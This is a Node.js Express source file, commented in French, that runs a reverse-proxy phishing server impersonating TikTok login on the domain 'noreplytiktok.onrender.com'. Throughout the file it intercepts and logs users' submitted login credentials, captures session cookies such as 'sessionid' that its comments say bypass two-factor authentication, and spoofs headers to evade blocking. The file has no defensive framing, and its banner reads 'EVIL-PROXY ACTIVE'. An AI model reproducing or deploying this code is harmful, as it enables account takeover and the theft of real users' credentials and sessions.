const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 10000;

// On sert ton interface de connexion personnalisée
app.use(express.static(path.join(__dirname)));

// Configuration du Proxy
const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    followRedirects: true,
    // CRITIQUE : Réécriture pour que le navigateur accepte les cookies sur ton domaine Render
    cookieDomainRewrite: {
        "*": "noreplytiktok.onrender.com"
    },
    // INTERCEPTION DES DONNÉES ENVOYÉES (Identifiants)
    onProxyReq: (proxyReq, req, res) => {
        // Si c'est une connexion, on essaie de lire le corps de la requête
        if (req.method === 'POST') {
            let bodyData = "";
            req.on('data', chunk => { bodyData += chunk; });
            req.on('end', () => {
                if (bodyData) {
                    console.log("\n[!] FLUX POST INTERCEPTÉ :");
                    console.log(decodeURIComponent(bodyData));
                    console.log("---------------------------\n");
                }
            });
        }
        // On imite un vrai navigateur pour éviter le blocage immédiat
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
        proxyReq.setHeader('Origin', 'https://www.tiktok.com');
    },
    // INTERCEPTION DE LA RÉPONSE (Cookies de session / 2FA)
    onProxyRes: (proxyRes, req, res) => {
        const cookies = proxyRes.headers['set-cookie'];
        if (cookies) {
            console.log("\n[X] JETONS DE SESSION DÉTECTÉS :");
            cookies.forEach(c => {
                // On logue les cookies qui permettent de bypass le 2FA (sessionid)
                if (c.includes('sessionid') || c.includes('ttwid') || c.includes('sid')) {
                    console.log(">>> " + c.split(';')[0]);
                }
            });
            console.log("-------------------------------\n");
        }
    }
};

// On applique le proxy sur toutes les routes de login de TikTok
app.use(['/api/**', '/passport/**', '/login/**'], createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("========================================");
    console.log("  BACOPS ENGINE : EVIL-PROXY ACTIVE");
    console.log("  URL: https://noreplytiktok.onrender.com");
    console.log("========================================");
});
